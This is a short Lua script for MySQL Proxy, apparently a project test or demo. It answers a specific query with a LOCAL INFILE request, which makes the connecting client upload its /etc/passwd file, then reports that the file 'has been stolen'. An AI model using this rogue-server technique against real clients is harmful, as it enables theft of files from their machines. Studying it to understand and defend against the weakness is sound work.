--[[ $%BEGINLICENSE%$
 Copyright (c) 2007, 2008, Oracle and/or its affiliates. All rights reserved.

 This program is free software; you can redistribute it and/or
 modify it under the terms of the GNU General Public License as
 published by the Free Software Foundation; version 2 of the
 License.

 This program is distributed in the hope that it will be useful,
 but WITHOUT ANY WARRANTY; without even the implied warranty of
 MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
 GNU General Public License for more details.

 You should have received a copy of the GNU General Public License
 along with this program; if not, write to the Free Software
 Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA
 02110-1301  USA

 $%ENDLICENSE%$ --]]

local in_load_data = 0;

function read_query(packet) 
	if in_load_data == 0 then
		if packet:byte() ~= proxy.COM_QUERY then return end

		if packet:sub(2) == "SELECT LOCAL(\"/etc/passwd\")" then
			proxy.response.type = proxy.MYSQLD_PACKET_RAW
			proxy.response.packets = {
				"\251/etc/passwd"
			}

			in_load_data = 1

			return proxy.PROXY_SEND_RESULT
		end
	else
		-- we should get data from the client now
		-- print(packet)

		in_load_data = 0

		proxy.response.type = proxy.MYSQLD_PACKET_RAW
		proxy.response.packets = {
			"\0" ..        -- field-count 0
			"\0" ..        -- affected rows
			"\0" ..        -- insert-id
			"\002\0" ..    -- server-status
			"\0\0" ..      -- warning-count
			string.char(27) .. "/etc/passwd has been stolen"
		}

		return proxy.PROXY_SEND_RESULT
	end
end
